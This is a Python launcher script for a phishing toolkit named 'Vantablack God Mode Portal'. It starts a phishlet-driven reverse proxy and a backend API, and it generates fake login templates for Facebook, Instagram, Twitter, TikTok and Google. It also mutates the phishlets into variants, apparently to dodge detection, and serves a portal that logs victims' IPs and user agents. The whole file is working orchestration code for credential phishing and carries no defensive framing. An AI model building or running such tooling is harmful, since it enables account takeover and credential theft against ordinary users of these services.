#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import logging
import httpx
import uvicorn
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from core.banner import print_alex_banner

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] GODMODE: %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("godmode")

app = FastAPI(title="Vantablack God Mode Portal")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
PORTAL_FILE = os.path.join(TEMPLATES_DIR, "godmode_portal.html")

PHISHLET_URLS = {
    "facebook": "https://www.facebook.com/login.php",
    "instagram": "https://www.instagram.com/accounts/login/",
    "twitter": "https://twitter.com/i/flow/login",
    "tiktok": "https://www.tiktok.com/login",
    "google": "https://accounts.google.com/signin"
}

class GodModeRunner:
    def __init__(self):
        self.processes = []
    def start_api(self):
        cmd = [sys.executable, "-m", "uvicorn", "api.rest_api:app", "--host", "0.0.0.0", "--port", "8000", "--reload"]
        p = subprocess.Popen(cmd)
        self.processes.append(p)
    def wait_api(self, timeout=15):
        t0 = time.time()
        while time.time() - t0 < timeout:
            try:
                with httpx.Client(timeout=2.0) as client:
                    r = client.get("http://127.0.0.1:8000/health")
                    if r.status_code == 200:
                        return True
            except Exception:
                time.sleep(0.5)
        return False
    def start_proxy(self, phishlet="phishlets/twitter.yaml"):
        env = os.environ.copy()
        env["PHISHLET"] = phishlet
        p = subprocess.Popen([sys.executable, "engine/proxy.py"], env=env)
        self.processes.append(p)
    def start_frontend(self):
        cwd = os.path.join(BASE_DIR, "web", "frontend")
        cmd = ["npm.cmd", "start"] if sys.platform.startswith("win") else ["npm", "start"]
        p = subprocess.Popen(cmd, cwd=cwd)
        self.processes.append(p)
    def run_templates(self, platform="twitter", template_type="login"):
        subprocess.run([sys.executable, "templates/cli.py", "generate", "--platform", platform, "--type", template_type, "--responsive"], check=False)
    def run_mutation(self, phishlet="phishlets/twitter.yaml"):
        subprocess.run([sys.executable, "analysis/mutation/cli.py", "mutate", phishlet, "--variants", "3", "--output", "mutated_phishlets"], check=False)
    def run_analysis(self, path="mutated_phishlets"):
        subprocess.run([sys.executable, "analysis/reverse_engineer/cli.py", "analyze", path, "--format", "json", "--output", "analysis.json"], check=False)
        subprocess.run([sys.executable, "analysis/reverse_engineer/cli.py", "signatures", "analysis.json", "--type", "all", "--format", "json", "--output", "signatures.json"], check=False)
    def run_report(self):
        rp = os.path.join(BASE_DIR, "reporting.py")
        if os.path.exists(rp):
            subprocess.run([sys.executable, rp], check=False)
    def open_war_room(self):
        path = os.path.abspath(os.path.join("templates", "war_room.html"))
        if sys.platform == "darwin":
            subprocess.Popen(["open", path])
        elif sys.platform.startswith("win"):
            os.startfile(path)
        else:
            subprocess.Popen(["xdg-open", path])
    def stop(self):
        for p in self.processes:
            try:
                p.terminate()
            except Exception:
                pass

@app.get("/", response_class=HTMLResponse)
async def portal(request: Request):
    ip = request.client.host
    ua = request.headers.get("user-agent", "Unknown")
    logger.info(f"{ip} | {ua}")
    if not os.path.exists(PORTAL_FILE):
        return HTMLResponse(content="<h1>Portal Not Found</h1>", status_code=500)
    with open(PORTAL_FILE, "r") as f:
        return f.read()

@app.get("/auth/{provider}")
async def auth(provider: str, request: Request):
    ip = request.client.host
    if provider not in PHISHLET_URLS:
        raise HTTPException(status_code=404, detail="Provider not supported")
    url = PHISHLET_URLS[provider]
    logger.info(f"{ip} -> {provider.upper()}")
    return RedirectResponse(url=url)

if __name__ == "__main__":
    print_alex_banner()
    runner = GodModeRunner()
    try:
        runner.start_api()
        runner.wait_api()
        runner.start_proxy()
        runner.open_war_room()
        runner.run_templates()
        runner.run_mutation()
        runner.run_analysis()
        runner.run_report()
        uvicorn.run(app, host="0.0.0.0", port=6666, log_level="error")
    except KeyboardInterrupt:
        runner.stop()
